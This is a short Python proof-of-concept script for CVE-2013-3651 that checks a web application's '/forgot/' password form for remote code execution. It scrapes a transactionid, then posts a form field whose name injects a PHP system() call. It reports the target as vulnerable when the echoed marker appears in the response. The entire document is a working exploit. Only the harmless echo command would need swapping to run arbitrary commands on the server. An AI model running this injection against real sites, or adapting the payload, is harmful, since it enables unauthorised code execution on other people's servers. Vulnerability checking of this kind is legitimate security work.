import re
import urllib.request
import sys

args = sys.argv

if len(args) != 2 :
    print ('Using: python poc_cve_2013_3651.py <Target URL>')
    exit()


opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
url = '%s/forgot/' % args[1]

# Get transaction value.
req = urllib.request.Request(url)
res = opener.open(req)
body = res.read().decode('utf-8')
res.close()
transactionid = re.findall(r' name="transactionid" value="([a-z0-9]+)"', body)[0]

# Post Check request.
post_data = urllib.parse.urlencode({
    'transactionid': transactionid,
    'mode': 'mail_check',
    'email': '',
    "name01[system('echo CVE$1_2013_3651')]": '',
    'name02': ''
}).encode('utf-8')

res = opener.open(req, post_data)
body = res.read().decode('utf-8')
res.close()

# print (body)
if re.findall(r'CVE_2013_3651', body) :
    print('Result: Vulnerable!')
else:
    print('Result: Not vulnerable...')
